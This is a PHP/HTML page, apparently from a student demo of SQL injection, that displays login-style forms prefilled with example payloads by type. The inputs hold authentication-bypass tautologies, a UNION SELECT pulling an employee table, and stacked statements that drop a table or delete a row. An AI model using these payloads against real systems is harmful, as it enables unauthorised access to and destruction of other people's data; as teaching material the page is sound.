<?php 
session_start();

	include("connection.php");
	include("functions.php");
   
    
	$user_data = check_login($con);

?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="icon" type="image/png"
			href="https://www.google.com/s2/favicons?domain=https://www.apachefriends.org/index.html">
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
	
    <link href="https://fonts.googleapis.com/css2?family=Russo+One&display=swap" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@700&display=swap" rel="stylesheet">

    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@500&display=swap" rel="stylesheet">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
	<link rel="stylesheet" href="./styles/style.css">
</head>
<style type="text/css">
        .nav-wrapper1 {
            border-radius: 5px 5px 0 0;
            grid-area: nav-wrapper;
            border-bottom: 1px solid var(--borderColor);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: rgb(7, 106, 155);
             
}

input {

display: block;

border: 2px solid #ccc;

width: 95%;

padding: 10px;

margin: 10px auto;

border-radius: 5px;

}

label {

color: rgb(37, 1, 1);

font-size: 18px;

padding: 10px;

}
.post-wrapper {
   
   display: grid;
   grid-template-columns: repeat(auto-fit, 320px);
   
   justify-content: center;
   
   background-color: var(--secondaryColor);
   width: 100%;
   border: 15px solid rgb(7, 106, 155);
  
   margin: 5px;
   display: grid;
   font-size: 18px;
   grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
 
  
         
        }
        a:link {
  color: black;
  background-color: transparent;
  text-decoration: none;
}
h1, p {
    text-align: center;
}

.card-container {
    display: grid;
    justify-content: center;
}

.card-img {
    padding-top: 1rem;
    padding-left: 1rem;
    margin: 1rem;
}

.example-container {
    display: grid;
    align-items: center;
}

.card-body {
    text-align: center;

}

.card-deck {
    margin: 0 0 1rem 0;
    display:flex;
    justify-content:space-around;
}
.center {
  margin-left: auto;
  margin-right: auto;
}
th, td {
  background-color: #96D4D4;
}
.nav-wrapper1 {
            border-radius: 5px 5px 0 0;
            grid-area: nav-wrapper;
            border-bottom: 1px solid var(--borderColor);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: rgb(7, 106, 155);
             
}

table {
  
  width: 100%;
}
a {
  color: black;
  background-color: transparent;
  text-decoration: none;
}

        .nav-wrapper1 {
            border-radius: 5px 5px 0 0;
            grid-area: nav-wrapper;
            border-bottom: 1px solid var(--borderColor);
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: rgb(7, 106, 155);
             
}
body{
    font-size: 18px;
}
input {

display: block;

border: 2px solid #ccc;

width: 95%;

padding: 10px;

margin: 10px auto;

border-radius: 5px;

}

label {

color: rgb(37, 1, 1);
font-size: 18px;
padding: 10px;

}
h1,
h2,
h3,
h4,
h5,
h6,
strong {
  color: var(--mainText);
  font-family: "Russo One", sans-serif;
  font-weight: 500;
}
p,
li,
span,
label,
input,
textarea {
  color: var(--secondaryText);
  font-family: "Lato", sans-serif;
  font-weight: 600;
  font-size: 20px;
}
.post-wrapper {
   
  display: grid;
  grid-template-columns: repeat(auto-fit, 320px);
  
  justify-content: center;
  
  background-color: var(--secondaryColor);
  width: 100%;
  border: 15px solid rgb(7, 106, 155);
 
  margin: 5px;
  display: grid;
  font-size: 18px;
  grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));

 
        }
   
        

        a{
  color: black;
  background-color: transparent;
  text-decoration: none;
}
.center {
  margin-left: auto;
  margin-right: auto;
}
  
        </style>
<body>
<div class="nav-wrapper1">

<!-- Link around dots-wrapper added after tutorial video -->
<a class="fb" class="w3-jumbo w3-teal" href="./index.html"><i class="fa fa-home" style="font-size:35px;" aria-hidden="true"></i></a>
<h2>Hello, <?php echo $user_data['user_name']; ?></h2> 

<button type="button" class="btn btn-default btn-sm">
  <span class="glyphicon glyphicon-log-out"></span><h6><a href="index.php" >Back</a></h6>
</button>

  


</div>
<div class="post-wrapper">
<div class="card-deck">
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">Additional where queries:</h5>
								<p class="card-text">
									<form>
										<label for="fname">Username:</label>
										<input type="text" id="uname1" name="uname" value="Anyname' OR '2'>'1 "><br>
										<label for="lname">Password:</label>
										<input type="text" id="pass1" name="pass" placeholder="leave blank" value="anything'or'x'='x"><br>
										
									</form>
								</p>
							</div>
				</div>
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">SQL Manipulation</h5>
								<p class="card-text">
									<form>
										<label for="fname">Username:</label>
                                        
                                        <input type="text" id="uname1" name="uname" value=" Anyname'  UNION ALL SELECT * from employee WHERE '1' = '1 "><br>
                                       
										<br>
										<label for="lname">Password:</label>
										<input type="text" id="pass2" name="pass" placeholder="leave blank"value="anything'or'x'='x"><br>
										
									</form>
								</p>
							</div>
				</div>
</div>
</div>
<div class="post-wrapper">
<div class="card-deck">
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">Insert subselect Queries:</h5>
								<p class="card-text">
									<form>
										<label for="fname">Username:</label>
										<input type="text" id="uname1" name="uname" value="(SELECT user_name FROM users) "><br>
										<label for="lname">Password:</label>
										<input type="text" id="pass1" name="pass" placeholder="leave blank" value="anything'or'x'='x"><br>
										
									</form>
								</p>
							</div>
				</div>
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">Manipulation query:</h5>
								<p class="card-text">
									<form>
										<label for="fname">Username:</label>
                                        
                                        <input type="text" id="uname1" name="uname" value=" Manasa' or '1'='1#;"><br>
                                        <input type="text" id="uname1" name="uname" value=" Anything' or 1=1;-- -"><br>
										<br>
										<label for="lname">Password:</label>
										<input type="text" id="pass2" name="pass" placeholder="leave blank"value="anything'or'x'='x"><br>
										
									</form>
								</p>
							</div>
				</div>
</div>
</div>
<div class="post-wrapper">
<div class="card-deck">
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">Piggy-backed Queries / Statement Injection:</h5>
								<p class="card-text">
									<form>
										<label for="fname">Username:</label>
										<input type="text" id="uname1" name="uname" value="Manju "><br>
										<label for="lname">Password:</label>
										<input type="text" id="pass1" name="pass" placeholder="leave blank" value="'; drop table fff -- '"><br>
										
									</form>
								</p>
							</div>
				</div>
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">Piggy-backed Queries / Statement Injection:</h5>
								<p class="card-text">
									<form>
										<label for="fname">Username:</label>
                                        
                                        <input type="text" id="uname1" name="uname" value=" Manasa"><br>
                                       
										<br>
										<label for="lname">Password:</label>
										<input type="text" id="pass2" name="pass" placeholder="leave blank"value="';Delete from employee where E_id=3 -- '"><br>
										
									</form>
								</p>
							</div>
				</div>
</div>
</div>
<!--
<h3 style="text-align: center;" >Code Injection</h3>
            <div class="post-wrapper">
            
			<div class="card-deck">
            
            <div class="post-wrapper">
				<div class="card">
							<div class="card-body">
								<h5 class="card-title"> Like queries
</h5>
								<p class="card-text">
									<form>
                                    <label for="fname">Manipulation query:</label>
										<h6><textarea rows="3" cols="50">SELECT * FROM employee WHERE
 E_name LIKE 'M%';
</textarea></h6>
  
		<br>
        <br>
        <br>
										


										<input type="submit" id="btn" value="Inject using Example 1"  onclick="myFunction1()">
                                       
									</form>
								</p>
							</div>
				</div>
                </div>
                </div>
                <div class="post-wrapper">
				<div class="card">
							<div class="card-body">
								<h5 class="card-title">Column Mismatch:</h5>
								<p class="card-text">
									<form>
										<label for="fname">Normal query:</label>
										
<h6><textarea rows="3" cols="50">
SELECT * FROM employee WHERE
E_name like '_a%'
                                       </textarea></h6> 

										<label for="lname">Manipulation query:
</label>
                                        <h6><textarea rows="3" cols="50">SELECT * FROM employee WHERE E_name like '_%';
</textarea></h6>
										<input type="submit" id="btn" value="Inject using Example 2"  onclick="myFunction2()">
									</form>
								</p>
							</div>
				</div>
			</div>
            </div>
            </div>-->
</body>
</html>